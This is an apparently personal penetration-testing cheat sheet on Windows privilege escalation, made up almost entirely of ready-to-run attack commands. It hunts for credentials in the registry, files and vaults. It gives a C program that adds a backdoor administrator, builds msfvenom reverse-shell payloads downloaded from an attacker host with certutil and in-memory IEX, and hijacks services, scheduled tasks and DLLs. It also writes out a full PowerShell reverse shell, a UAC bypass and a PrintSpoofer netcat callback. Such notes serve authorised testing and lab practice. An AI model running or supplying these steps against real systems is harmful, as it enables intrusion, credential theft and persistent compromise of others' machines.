---
title: Windows Privilege Escalation
type: note
tab: Privesc
inputs: [Shell]
outputs: [Admin, Services, Privileges]
tags: [Windows, PrivilegeEscalation]
---

# Windows Privilege Escalation

## Quick Checks

#Shell #Windows #PrivilegeEscalation
Quick Windows privesc checklist for user context, services, installer policy, and interesting software paths.

```powershell
# OS and architecture.
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Current user, groups, and privileges.
whoami
whoami /priv
whoami /groups
whoami /all

# Users and local administrators.
net users
net localgroup administrators

# Scheduled tasks. Look for tasks running as SYSTEM and non-Microsoft task paths.
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" } | Format-Table TaskName,TaskPath,State

# List services and look for unquoted paths.
net start
sc query
Get-Service
wmic service get name,displayname,pathname,startmode
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\"
icacls "C:\Path\To\Service.exe"

# AlwaysInstallElevated registry keys.
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Installed software and common writable install paths.
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName
dir C:\
dir "C:\Program Files"
dir "C:\Program Files (x86)"
dir C:\ProgramData
```

## Credential Hunting

#Shell #Windows #Looting #PrivilegeEscalation
Search common Windows locations for saved credentials, unattended install files, vault entries, private keys, and PowerShell history.

```cmd
:: Registry password searches.
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

:: File and config searches.
dir /s /b *pass* *cred* *vnc* *.config*
findstr /si password *.xml *.ini *.txt *.config
dir C:\ /s /b | findstr /i pass

:: Unattended install files.
type C:\Unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\system32\sysprep.inf

:: Windows credential stores.
cmdkey /list
vaultcmd /listcreds:"Windows Credentials" /all

:: Private keys and KeePass databases.
dir /s /b C:\*.kdbx C:\*.ppk C:\*.pem C:\*.key
powershell -c "Get-ChildItem -Recurse -ErrorAction SilentlyContinue -Filter *.kdbx"

:: PowerShell history.
dir C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## Autoruns

#Shell #Windows #PrivilegeEscalation
Check autorun registry keys for writable executable paths or command values that run at logon.

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

## Writable Service / Binary Hijack

### Writable Service Binary Hijack Example 1

#Shell #Windows #PrivilegeEscalation
Example 1 - writable service binary replacement.

1. Check whether the target binary is writable. `F` means full control.

```sh
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

2. Create `adduser.c` with this payload body on the attacker box.

```c
#include <stdlib.h>
int main() {
  system("net user <USER> <PASS> /add");
  system("net localgroup administrators <USER> /add");
  return 0;
}
```

3. Compile the payload.

```sh
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

4. Download the payload on the target.

```powershell
certutil.exe -urlcache -f http://<LHOST>/adduser.exe adduser.exe
iwr -Uri http://<LHOST>/adduser.exe -OutFile adduser.exe
```

5. Replace the writable binary and trigger reboot.

```cmd
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe.bak
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
shutdown /r /t 0
```

6. Verify the new admin user.

```cmd
net user
net localgroup administrators
```

### Writable Service Binary Hijack Example 2

#Shell #Windows #PrivilegeEscalation
Example 2 - writable scheduled-task binary replacement.

1. Find a non-Microsoft task and confirm the executable path.

```powershell
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' }
schtasks /query /tn "<TASK_NAME>" /v /fo list
icacls "C:\backup\backup.exe"
```

2. Generate and host the replacement binary.

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o backup.exe
python3 -m http.server 80
nc -lvnp <LPORT>
```

3. Replace the binary and start the scheduled task.

```powershell
certutil -urlcache -f http://<LHOST>/backup.exe "C:\backup\backup.exe"
Start-ScheduledTask -TaskName "<TASK_NAME>"
```

## Add Local Admin User

#Shell #Windows #PrivilegeEscalation
Create a user and add it to local administrators.

```cmd
net user <USER> <PASS> /add
net localgroup administrators <USER> /add
```

## Audit Scripts

#Shell #Windows #PrivilegeEscalation
Run common Windows privesc PowerShell audit scripts from disk or in memory.

```powershell
# PowerUp
certutil.exe -urlcache -f http://<LHOST>/PowerUp.ps1 PowerUp.ps1
powershell -ExecutionPolicy Bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1') | IEX
Invoke-PrivescAudit

# Seatbelt
Seatbelt.exe -group=all

# PrivescCheck
. .\PrivescCheck.ps1
Invoke-PrivescCheck
Invoke-PrivescCheck --Extended
(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/PrivescCheck.ps1') | IEX
Invoke-PrivescCheck --Extended

# winPEAS PowerShell
(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/winPEAS.ps1') | IEX

# winPEAS executable: download to the Windows target.
certutil.exe -urlcache -f http://<LHOST>/winPEASx64.exe winPEASx64.exe
powershell -c "iwr http://<LHOST>/winPEASx64.exe -OutFile winPEASx64.exe"

# Run normal check.
.\winPEASx64.exe

# Save output for review.
.\winPEASx64.exe > winpeas.out
.\winPEASx64.exe > winpeas.out 2>&1

# Search high-signal findings in PowerShell.
Select-String -Path .\winpeas.out -Pattern "AlwaysInstallElevated|SeImpersonate|SeDebug|Password|Credential|AutoLogon|Unquoted|Service|Writable|PATH|SAM|SYSTEM|Kerberoast|ASREPRoast|Privileged|Admin" -CaseSensitive:$false

# Search high-signal findings in cmd.
findstr /i "AlwaysInstallElevated SeImpersonate SeDebug Password Credential AutoLogon Unquoted Service Writable PATH SAM SYSTEM Kerberoast ASREPRoast Privileged Admin" winpeas.out
```

## AccessChk Permission Review

#Shell #Windows #PrivilegeEscalation
Use Sysinternals `accesschk.exe` to confirm writable services, binaries, directories, and registry keys.

```cmd
:: Check service permissions.
accesschk.exe -accepteula -uwcqv "Authenticated Users" *
accesschk.exe -accepteula -uwcqv "Everyone" *

:: Check binary and directory permissions.
accesschk.exe -accepteula -quvw C:\Path\To\Service.exe
accesschk.exe -accepteula -uwdq "C:\Program Files\"

:: Check writable service registry keys.
accesschk.exe -accepteula -uvwk HKLM\System\CurrentControlSet\Services
```

## AlwaysInstallElevated

#Shell #Windows #PrivilegeEscalation
Exploit AlwaysInstallElevated when both HKCU and HKLM installer policy keys are enabled.

1. Check the required registry keys.

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

2. Create a malicious MSI on Kali.

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o installer.msi
```

3. Download and execute the MSI silently on the target.

```powershell
certutil.exe -urlcache -f http://<LHOST>/installer.msi C:\Users\Public\installer.msi
msiexec /quiet /qn /i C:\Users\Public\installer.msi
```

If you have GUI access, another option is wrapping `cmd.exe` into an MSI with an Exe-to-MSI wrapper and launching the MSI directly.

## Unquoted Service Paths

### Unquoted Service Path Example 1

#Shell #Windows #PrivilegeEscalation
Example 1 - generic unquoted auto-start service path.

1. Find unquoted auto-start services outside `C:\Windows`.

```cmd
wmic service where "StartMode='Auto' AND PathName LIKE '% %' AND NOT PathName LIKE '\"%' AND NOT PathName LIKE 'C:\\Windows\\%'" get Name,DisplayName,PathName
```

2. Check write permission on the vulnerable path.

```cmd
icacls "C:\Program Files\Vulnerable Service1"
```

3. Create the replacement executable on Kali.

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o Service.exe
```

4. Download the payload into the service path and start the service.

```cmd
certutil -urlcache -split -f "http://<LHOST>/Service.exe" "C:\Program Files\Vulnerable Service1\Service.exe"
sc start "Vuln Service 1"
net start "Vuln Service 1"
```

### Unquoted Service Path Example 2

#Shell #Windows #PrivilegeEscalation
Example 2 - specific writable executable from an unquoted path finding.

```powershell
# Confirm the finding and writable executable path.
Invoke-PrivescCheck
icacls "C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe"
wmic service get name,displayname,pathname,startmode | findstr /i zero
sc query ZeroTierOneService

# Attacker: build and host payload.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o z.exe

# Target: replace the writable service binary and start the service.
iwr -Uri http://<LHOST>/z.exe -OutFile z.exe
cp .\z.exe "C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe" -Force
sc start ZeroTierOneService
```

## Scheduled Task Script Hijack

#Shell #Windows #PrivilegeEscalation
Hijack a scheduled task script when it runs as SYSTEM and the script path is writable.

1. Find non-Microsoft scheduled tasks.

```powershell
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' }
```

2. Inspect the interesting task and script permission.

```cmd
schtasks /query /tn "VulnerableTask" /v /fo list
icacls C:\Users\Public\TaskScript\taskscript.ps1
```

3. Replace `taskscript.ps1` with this PowerShell reverse shell body.

```file-powershell
$LHOST = "<LHOST>"
$LPORT = <LPORT>
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
$NetworkStream = $TCPClient.GetStream()
$StreamReader = New-Object IO.StreamReader($NetworkStream)
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
$StreamWriter.AutoFlush = $true
$Buffer = New-Object System.Byte[] 1024
while ($TCPClient.Connected) {
  while ($NetworkStream.DataAvailable) {
    $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
    $Code = ([Text.Encoding]::UTF8).GetString($Buffer, 0, $RawData - 1)
  }
  if ($TCPClient.Connected -and $Code.Length -gt 1) {
    $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }
    $StreamWriter.Write("$Output`n")
    $Code = $null
  }
}
$TCPClient.Close()
$NetworkStream.Close()
$StreamReader.Close()
$StreamWriter.Close()
```

4. Catch the scheduled callback.

```sh
nc -lvnp <LPORT>
```

## DLL Hijacking

#Shell #Windows #PrivilegeEscalation
Find a missing DLL loaded by a privileged service, place a malicious DLL there, and restart the service.

```sh
# 1. In Procmon, filter for missing DLL loads from privileged services:
# Result contains NAME NOT FOUND
# User contains NT
# Path ends with dll
# Path contains System32 -> exclude

# 1b. Check PATH directories for write access.
for %A in ("%path:;="" "%") do (cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :..I)" | findstr /i ":\\" && echo %~A)

# 2. Attacker: create a DLL payload.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o exp.dll

# 3. Target: download the DLL into the missing DLL path.
certutil -urlcache -split -f "http://<LHOST>/exp.dll" "C:\LabService\VERSION.dll"

# 4. Target: restart the service if possible, or reboot as a last resort.
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>
shutdown /s /f /t 0
```

## XAMPP MySQL Local-Only Pivot

#Shell #Windows #PrivilegeEscalation #Pivoting
When XAMPP MySQL only listens on localhost, tunnel it back with Chisel and use MySQL file-write primitives.

1. Inspect phpMyAdmin config for local MySQL credentials.

```cmd
type C:\xampp\phpMyAdmin\config.inc.php
```

2. Start Chisel on Kali and forward target localhost MySQL back to Kali.

```sh
chisel server -p <LPORT> --reverse
```

```powershell
iwr -Uri http://<LHOST>/chisel.exe -OutFile chisel.exe
.\chisel.exe client <LHOST>:<LPORT> R:3306:127.0.0.1:3306
```

3. Connect to MySQL from Kali and check whether arbitrary file writes are allowed.

```sh
mysql -u root -h 127.0.0.1 --skip-ssl
```

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

4. Create and upload a DLL payload.

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o phoneinfo.dll
```

```powershell
iwr -Uri http://<LHOST>/phoneinfo.dll -OutFile C:\xampp\htdocs\phoneinfo.dll
```

5. Write the DLL to a target path from MySQL if file writes are allowed.

```sql
SELECT LOAD_FILE('C:/xampp/htdocs/phoneinfo.dll') INTO DUMPFILE 'C:/Windows/System32/phoneinfo.dll';
```

## Run As Another User

#Username #Password #Windows #PrivilegeEscalation
Run a process as another user if you know valid local or admin creds.

```cmd
:: You will be prompted for <PASS>.
runas.exe /user:<USER> cmd
```

## UAC Bypass

#Shell #Windows #PrivilegeEscalation
Run the Fodhelper UAC bypass from disk or directly from an attacker web server.

```powershell
# From disk.
powershell -ExecutionPolicy Bypass
. .\FodhelperBypass.ps1
FodhelperBypass -program "cmd.exe /c powershell.exe"

# In-memory from attacker host.
(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/FodhelperBypass.ps1') | IEX
FodhelperBypass -program "cmd.exe /c powershell -e <BASE64_PAYLOAD>"
```

## PrintSpoofer

#Shell #Windows #PrivilegeEscalation
Abuse `SeImpersonatePrivilege` with PrintSpoofer to spawn a privileged shell or callback.

```powershell
# Attacker: download PrintSpoofer and host it.
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
python3 -m http.server 80

# Target: download PrintSpoofer.
certutil.exe -urlcache -f http://<LHOST>/PrintSpoofer64.exe PrintSpoofer64.exe

# Interactive command shell.
.\PrintSpoofer64.exe -i -c cmd

# Reverse shell with nc.exe.
certutil.exe -urlcache -f http://<LHOST>/nc.exe nc.exe
.\PrintSpoofer64.exe -c "nc.exe <LHOST> <LPORT> -e cmd"
```

## Metasploit Local Exploits

#Shell #Windows #PrivilegeEscalation
Use Metasploit's local exploit suggester after getting a Meterpreter session.

```text
use multi/recon/local_exploit_suggester
set SESSION <SESSION_ID>
run
```

## Remote Execution After Admin

#Username #Password #SMB #Windows #Exploitation
Use psexec after obtaining local admin credentials.

```sh
impacket-psexec '<USER>:<PASS>'@<TARGET_IP>
```
